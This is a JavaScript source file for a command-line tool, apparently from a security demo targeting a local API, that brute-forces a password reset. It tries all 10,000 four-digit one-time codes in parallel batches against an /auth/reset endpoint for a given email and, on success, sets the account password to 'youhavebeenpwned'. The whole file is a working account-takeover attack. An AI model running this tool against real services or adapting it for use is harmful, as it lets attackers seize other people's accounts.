const axios = require('axios');
const fs = require('fs');
const ProgressBar = require('progress');

const Command = require('./command');

class ResetPassword extends Command {
  constructor() {
    super(
      'resetpwd',
      'Accepts an email addresses and brute forces a password reset.',
      [
        [ '<email address>', 'The email address to change the password for.']
      ],
      [
        [ '-h', '--host <host>', 'The hostname for the API endpoint. Default is localhost.'],
        [ '-p', '--port <port>', 'The port for the API endpoint. Default is 3333.'],
        [ '-s', '--https', 'Use https for the connection.'],
        [ '-b', '--batchSize', 'Batch size for requests. Default is 10.']
      ]
    );
  }

  async action(email, options) {
    const host = options.host ? options.host : 'localhost';
    const port = options.port ? options.port : '3333';
    const protocol = options.https ? 'https' : 'http'
    const url = `${protocol}://${host}:${port}/auth/reset`;

    console.log(`Attacking ${url}`);

    const start = new Date();
    const password = 'youhavebeenpwned';
    const batchSize = options.batchSize ? parseInt(options.batchSize) : 10;

    const bar = new ProgressBar('[:bar] :percent :etas', {
      complete: '=',
      incomplete: ' ',
      width: 50,
      total: 10000,
      renderThrottle: 100
    });
    
    const batch = [];
    let success = false;
    for (let i = 0; !success && i < 10000; i++) {
      batch.push(i.toString().padStart(4, '0'));

      if (batch.length == batchSize || i == 9999) {
        await Promise.all(batch.map(async (one_time_password) => {
          try {
            return axios.put(
                url, 
                { email, password, one_time_password }, 
                { validateStatus: () => true }
              ).then((res) => {
                bar.tick();
                if (res.status == 200) {
                  bar.update(1);
                  success = true;
                }
              }).catch((err) => console.log('error'));
          } catch (err) {
            console.log(err);
          }
        }));
        
        // clear batch
        batch.length = 0;
      }
    }
    
    if (success) {
      console.log(`\nDuration: ${(new Date() - start) / 1000} secs`);
      console.log(`Password for ${email} is now ${password}\n`);
    } else console.log(`Failed to reset the password for ${email}`);
  }
}

module.exports = ResetPassword;